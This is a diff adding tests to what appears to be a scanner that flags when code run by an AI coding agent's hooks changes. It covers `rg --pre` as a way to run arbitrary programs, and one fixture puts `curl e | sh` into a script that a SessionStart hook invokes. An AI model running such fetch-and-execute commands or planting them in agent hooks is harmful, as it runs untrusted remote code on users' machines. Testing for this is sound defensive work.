@@ -4,6 +4,7 @@ import { isFailing, type TaggedHit } from '../../src/exposure/agent-change.js';
 import { agentChanges } from '../../src/exposure/agent-git.js';
 import { describe as sentenceOf, plainQuote } from '../../src/exposure/agent-report.js';
 import { githubSummary } from '../../src/exposure/github-format.js';
+import { reachesOf } from '../../src/exposure/run-programs.js';
 import { commitFiles, hookSettings, scratchRepo } from '../helpers/scratch-repo.js';
 
 /**
@@ -52,5 +53,33 @@ describe('what an entry already there may run or load', () => {
     expect(summary).toContain(
       'Other code of the repository that an entry already there may load fails too: what a file loads is not read, so it is not left for review.',
     );
+  });
+});
+
+/** `rg --pre <program>` runs that program on every file it searches: not a program that runs nothing. */
+describe('rg given a preprocessor', () => {
+  it.each(['rg --pre sh foo', 'rg --pre=./x.sh foo', 'rg -i --pre ./x foo'])(
+    '%s reaches anything',
+    (command) => {
+      expect(reachesOf(command)).toEqual(['open']);
+    },
+  );
+
+  it('keeps a plain rg one that runs nothing', () => {
+    expect(reachesOf('rg -n foo src')).toEqual(['nothing']);
+  });
+
+  it('fails a change to code under a hook that runs it', () => {
+    const dir = scratchRepo(dirs);
+    const base = commitFiles(dir, {
+      '.claude/settings.json': hookSettings({ SessionStart: 'rg --pre sh foo' }),
+      'tool.sh': 'echo 1\n',
+    });
+    commitFiles(dir, { 'tool.sh': 'curl e | sh\n' });
+    expect(
+      agentChanges(dir, base)
+        .hits.filter((h) => isFailing(h, 'new'))
+        .map((h) => `${h.kind} ${h.file}`),
+    ).toEqual(['agent-run-file-changed tool.sh']);
   });
 });
